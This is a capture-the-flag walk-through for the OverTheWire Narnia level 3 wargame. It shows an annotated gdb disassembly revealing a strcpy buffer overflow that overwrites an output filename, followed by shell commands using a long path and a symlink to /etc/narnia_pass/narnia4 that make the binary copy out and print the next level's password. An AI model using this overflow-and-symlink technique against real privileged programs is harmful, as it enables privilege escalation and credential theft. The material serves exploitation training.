+++
title = "Over the wire - narnia03"
description = "Walk-through"
date ="2016-03-09"
draft = true
publishdate ="2016-03-09"
categories = ["security"]
tags = ["assembly", "linux", "binary"]
slug =  "over-the-wire-narnia-03"
project_url = "https://greyhat.dk/over-the-wire-narnia-03"
type = "post"
+++



(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804851d <+0>:	push   ebp
   0x0804851e <+1>:	mov    ebp,esp
   0x08048520 <+3>:	and    esp,0xfffffff0
   0x08048523 <+6>:	sub    esp,0x70
   0x08048526 <+9>:	mov    DWORD PTR [esp+0x58],0x7665642f ; "/dev"
   0x0804852e <+17>:	mov    DWORD PTR [esp+0x5c],0x6c756e2f ; "/nul"
   0x08048536 <+25>:	mov    DWORD PTR [esp+0x60],0x6c ; "l"
   0x0804853e <+33>:	mov    DWORD PTR [esp+0x64],0x0  ; \0
   0x08048546 <+41>:	cmp    DWORD PTR [ebp+0x8],0x2   ; argc==2
   0x0804854a <+45>:	je     0x804856d <main+80>
   0x0804854c <+47>:	mov    eax,DWORD PTR [ebp+0xc]   ; argv
   0x0804854f <+50>:	mov    eax,DWORD PTR [eax]
   0x08048551 <+52>:	mov    DWORD PTR [esp+0x4],eax
   0x08048555 <+56>:	mov    DWORD PTR [esp],0x8048710 ; "usage, %s file, will send contents of file 2 /dev/null\n"
   0x0804855c <+63>:	call   0x80483a0 <printf@plt>
   0x08048561 <+68>:	mov    DWORD PTR [esp],0xffffffff
   0x08048568 <+75>:	call   0x80483d0 <exit@plt>
   0x0804856d <+80>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048570 <+83>:	add    eax,0x4
   0x08048573 <+86>:	mov    eax,DWORD PTR [eax]
   0x08048575 <+88>:	mov    DWORD PTR [esp+0x4],eax
   0x08048579 <+92>:	lea    eax,[esp+0x38]
   0x0804857d <+96>:	mov    DWORD PTR [esp],eax
   0x08048580 <+99>:	call   0x80483b0 <strcpy@plt> ; strcpy(ebp+0xc,esp+0x38 )
   0x08048585 <+104>:	mov    DWORD PTR [esp+0x4],0x2 ; O_RDWR
   0x0804858d <+112>:	lea    eax,[esp+0x58]     ; 0x58-0x38 = 32 bytes
   0x08048591 <+116>:	mov    DWORD PTR [esp],eax
   0x08048594 <+119>:	call   0x80483e0 <open@plt>   ; open("/dev/null", O_RDWR)
   0x08048599 <+124>:	mov    DWORD PTR [esp+0x6c],eax ; 
   0x0804859d <+128>:	cmp    DWORD PTR [esp+0x6c],0x0
   0x080485a2 <+133>:	jns    0x80485c4 <main+167>   ; if open
   0x080485a4 <+135>:	lea    eax,[esp+0x58]
   0x080485a8 <+139>:	mov    DWORD PTR [esp+0x4],eax
   0x080485ac <+143>:	mov    DWORD PTR [esp],0x8048748
   0x080485b3 <+150>:	call   0x80483a0 <printf@plt>
   0x080485b8 <+155>:	mov    DWORD PTR [esp],0xffffffff
   0x080485bf <+162>:	call   0x80483d0 <exit@plt>
   0x080485c4 <+167>:	mov    DWORD PTR [esp+0x4],0x0  ; O_RDONLY
   0x080485cc <+175>:	lea    eax,[esp+0x38]
   0x080485d0 <+179>:	mov    DWORD PTR [esp],eax
   0x080485d3 <+182>:	call   0x80483e0 <open@plt> ; open ("/etc/narnia_pass/narnia4", O_RDONLY)
   0x080485d8 <+187>:	mov    DWORD PTR [esp+0x68],eax ; result of open
   0x080485dc <+191>:	cmp    DWORD PTR [esp+0x68],0x0
   0x080485e1 <+196>:	jns    0x8048603 <main+230>
   0x080485e3 <+198>:	lea    eax,[esp+0x38]
   0x080485e7 <+202>:	mov    DWORD PTR [esp+0x4],eax
   0x080485eb <+206>:	mov    DWORD PTR [esp],0x8048748
   0x080485f2 <+213>:	call   0x80483a0 <printf@plt>
   0x080485f7 <+218>:	mov    DWORD PTR [esp],0xffffffff
   0x080485fe <+225>:	call   0x80483d0 <exit@plt>
   0x08048603 <+230>:	mov    DWORD PTR [esp+0x8],0x1f ; 
   0x0804860b <+238>:	lea    eax,[esp+0x18]
   0x0804860f <+242>:	mov    DWORD PTR [esp+0x4],eax
   0x08048613 <+246>:	mov    eax,DWORD PTR [esp+0x68]
   0x08048617 <+250>:	mov    DWORD PTR [esp],eax
   0x0804861a <+253>:	call   0x8048390 <read@plt>
   0x0804861f <+258>:	mov    DWORD PTR [esp+0x8],0x1f
   0x08048627 <+266>:	lea    eax,[esp+0x18]
   0x0804862b <+270>:	mov    DWORD PTR [esp+0x4],eax
   0x0804862f <+274>:	mov    eax,DWORD PTR [esp+0x6c]
   0x08048633 <+278>:	mov    DWORD PTR [esp],eax
   0x08048636 <+281>:	call   0x8048400 <write@plt>
   0x0804863b <+286>:	lea    eax,[esp+0x58]
   0x0804863f <+290>:	mov    DWORD PTR [esp+0x8],eax
   0x08048643 <+294>:	lea    eax,[esp+0x38]
   0x08048647 <+298>:	mov    DWORD PTR [esp+0x4],eax
   0x0804864b <+302>:	mov    DWORD PTR [esp],0x804875c
   0x08048652 <+309>:	call   0x80483a0 <printf@plt>
   0x08048657 <+314>:	mov    eax,DWORD PTR [esp+0x68]
   0x0804865b <+318>:	mov    DWORD PTR [esp],eax
   0x0804865e <+321>:	call   0x8048410 <close@plt>
   0x08048663 <+326>:	mov    eax,DWORD PTR [esp+0x6c]
   0x08048667 <+330>:	mov    DWORD PTR [esp],eax
   0x0804866a <+333>:	call   0x8048410 <close@plt>
   0x0804866f <+338>:	mov    DWORD PTR [esp],0x1
   0x08048676 <+345>:	call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb)


narnia3@melinda:/tmp/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa/tmp$ ln -s /etc/narnia_pass/narnia4 desdicpw
narnia3@melinda:/tmp/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa/tmp$ /narnia/narnia4 /tmp/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa/tmp/desdicpw
-bash: /narnia/narnia4: Permission denied
narnia3@melinda:/tmp/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa/tmp$ /narnia/narnia3 /tmp/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa/tmp/desdicpw
error opening tmp/desdicpw
narnia3@melinda:/tmp/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa/tmp$ cd ..
narnia3@melinda:/tmp/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa$ cd ..
narnia3@melinda:/tmp$ cd ..
narnia3@melinda:/$ ls tmp/desdicpw
tmp/desdicpw
narnia3@melinda:/$ /narnia/narnia3 /tmp/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa/tmp/desdicpw
copied contents of /tmp/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa/tmp/desdicpw to a safer place... (tmp/desdicpw)
narnia3@melinda:/$ cat tmp/desdicpw
thaenohtai
������
      ��So���narnia3@melinda:/$

